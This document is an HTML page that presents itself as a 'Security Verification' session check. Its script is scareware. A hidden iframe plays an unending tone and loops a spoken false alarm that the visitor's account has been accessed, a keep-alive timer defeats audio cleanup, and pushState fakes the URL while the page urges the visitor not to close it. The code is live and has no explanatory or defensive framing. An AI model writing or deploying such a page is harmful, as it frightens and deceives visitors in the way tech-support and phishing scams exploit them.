<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h2>Verifying Your Session...</h2>
  <div class="spinner"></div>
  <div id="status">Awaiting authorization...</div>

  <script>
    // 1. Create Hidden Iframe for Audio Keep-Alive
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.sandbox = "allow-scripts allow-same-origin allow-autoplay"; 
    document.body.appendChild(iframe);

    const iframeDoc = iframe.contentWindow.document;
    iframeDoc.open();
    iframeDoc.write(`
      <script>
        let audioCtx = null;
        let activeOsc = null;

        function startAudio() {
          try {
            if (!audioCtx) {
              audioCtx = new (window.AudioContext || window.webkitAudioContext)();
              if (audioCtx.state === 'suspended') audioCtx.resume();
            }
            if (activeOsc) {
              try { activeOsc.stop(); } catch(e) {}
              activeOsc = null;
            }
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.value = 440;
            gain.gain.value = 0.05;
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            activeOsc = osc;
          } catch (e) {}
        }

        startAudio();

        window.addEventListener('message', (e) => {
          if (e.data === 'RESTART_AUDIO') {
            startAudio();
          }
        });

        if ('speechSynthesis' in window) {
          const text = "Security Alert. Your account has been accessed. ".repeat(5);
          function speakLoop() {
            const utter = new SpeechSynthesisUtterance(text);
            utter.lang = 'en-US';
            utter.rate = 0.8;
            utter.onend = speakLoop;
            window.speechSynthesis.speak(utter);
          }
          speakLoop();
        }
      <\/script>
    `);
    iframeDoc.close();

    // 2. Keep-Alive Loop to prevent audio cleanup
    setInterval(() => {
      try {
        iframe.contentWindow.postMessage('RESTART_AUDIO', '*');
      } catch(e) {}
    }, 1000);

    // 3. Stealth UI Spoofing via pushState
    setTimeout(() => {
      try {
        window.history.pushState({}, '', '/session-verify');
        
        document.body.innerHTML = `
          <div style="text-align: center; margin-top: 100px;">
            <h2 style="color: #333;">Verifying Session...</h2>
            <div class="spinner"></div>
            <p style="color: #666;">Please wait. Do not close this page.</p>
          </div>
        `;
      } catch (e) {}
    }, 1500);
  </script>
</body>
</html>
